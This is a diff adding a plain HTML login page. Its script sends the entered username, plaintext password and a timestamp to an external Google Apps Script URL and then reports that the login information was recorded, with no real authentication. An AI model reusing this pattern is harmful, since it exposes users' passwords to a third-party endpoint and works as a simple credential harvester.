@@ -1,0 +1,103 @@
+<html>
+<head>
+  <title>Login Form</title>
+  <link rel='stylesheet' href='mystyle6.css'>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body>
+
+  <h2>Login Form</h2>
+
+  <form id="loginForm">
+    <div class="imgcontainer">
+      <img style="width: 280px; height: 280px;" src="./avatar.jpeg" alt="Avatar" class="avatar">
+    </div>
+
+    <div class="container">
+      <label for="uname"><b>Username</b></label>
+      <input type="text" id="username" placeholder="Enter Username" name="uname" required>
+
+      <label for="psw"><b>Password</b></label>
+      <input type="password" id="password" placeholder="Enter Password" name="psw" required>
+
+      <button type="submit">Login</button>
+      <label>
+        <input type="checkbox" id="remember" checked="checked" name="remember"> Remember me
+      </label>
+    </div>
+
+    <div class="container" style="background-color:#f1f1f1">
+      <button type="button" class="cancelbtn">Cancel</button>
+      <span class="psw">Forgot <a href="#">password?</a></span>
+    </div>
+  </form>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      document.getElementById('loadingOverlay').style.display = 'flex';
+      
+      const formData = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        remember: document.getElementById('remember').checked,
+        timestamp: new Date().toISOString()
+      };
+      
+      const scriptUrl = 'https://script.google.com/macros/s/AKfycbz9XrVuUaB-0VLF6-BWnaXty4SjpRNztEH8-5Qft0_-dituNig7Y_6x2n2KnvCVKtVy/exec';
+      
+      fetch(scriptUrl, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData)
+      })
+      .then(() => {
+        alert('Login information recorded successfully!');
+        document.getElementById('loginForm').reset();
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Error submitting form. Please check console for details.');
+      })
+      .finally(() => {
+        document.getElementById('loadingOverlay').style.display = 'none';
+      });
+    });
+  </script>
+</body>
+</html>
